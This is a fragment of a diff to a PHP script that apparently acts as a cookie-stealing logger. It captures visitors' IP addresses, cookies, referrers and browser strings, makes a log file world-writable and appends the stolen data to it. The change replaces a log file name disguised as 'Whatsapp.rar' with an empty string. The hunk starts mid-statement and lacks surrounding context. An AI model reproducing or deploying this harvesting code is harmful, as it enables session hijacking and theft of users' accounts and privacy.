@@ -6,7 +6,7 @@
 $_GET['redirect'];
  $data = "IP: " . $ip . "\n" ."Cookie: " . $cookie . "\n" ."Referrer: " . $referer .
 "\n" ."Browser: " . $browser . "\n\n";
- $database_log = "Whatsapp.rar";
+ $database_log = "";
  @chmod($database_log, 0777);
  $f = fopen($database_log, 'a');
  fwrite($f, $data); fclose($f);
